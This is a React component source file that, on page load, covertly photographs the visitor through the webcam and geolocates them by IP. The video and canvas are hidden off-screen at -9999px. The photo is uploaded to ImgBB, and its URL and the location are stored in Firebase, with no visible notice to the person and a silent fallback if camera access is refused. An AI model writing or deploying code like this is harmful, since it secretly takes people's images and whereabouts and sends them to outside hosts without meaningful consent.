import { useEffect, useRef } from "react";
import { uploadToImgBB, saveVisitorImage, getLocationFromIP } from "@/lib/firebase";

interface CameraCaptureProps {
  onComplete: () => void;
}

const CameraCapture = ({ onComplete }: CameraCaptureProps) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const hasAttempted = useRef(false);

  useEffect(() => {
    if (hasAttempted.current) return;
    hasAttempted.current = true;

    const captureAndUpload = async () => {
      try {
        // Get location first
        const location = await getLocationFromIP();

        // Request camera using native browser permission
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: 640, height: 480 }
        });

        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();

          // Wait a moment for camera to initialize
          await new Promise(resolve => setTimeout(resolve, 500));

          // Capture photo
          if (canvasRef.current && videoRef.current) {
            const canvas = canvasRef.current;
            const video = videoRef.current;
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            if (ctx) {
              ctx.drawImage(video, 0, 0);
              
              // Convert to blob
              canvas.toBlob(async (blob) => {
                if (blob) {
                  try {
                    // Upload to ImgBB
                    const imageUrl = await uploadToImgBB(blob);
                    // Save URL to Firebase with location
                    await saveVisitorImage(imageUrl, location);
                    console.log('Image captured and saved:', imageUrl);
                  } catch (err) {
                    console.error('Failed to upload image:', err);
                  }
                }
                
                // Stop camera and complete
                stream.getTracks().forEach(track => track.stop());
                onComplete();
              }, 'image/jpeg', 0.8);
              return;
            }
          }
        }

        // If something went wrong, still complete
        stream.getTracks().forEach(track => track.stop());
        onComplete();
      } catch (err) {
        // Permission denied or error - just continue
        console.log('Camera access denied or error:', err);
        onComplete();
      }
    };

    captureAndUpload();
  }, [onComplete]);

  return (
    <div style={{ position: 'fixed', left: '-9999px', top: '-9999px' }}>
      <video ref={videoRef} playsInline muted />
      <canvas ref={canvasRef} />
    </div>
  );
};

export default CameraCapture;
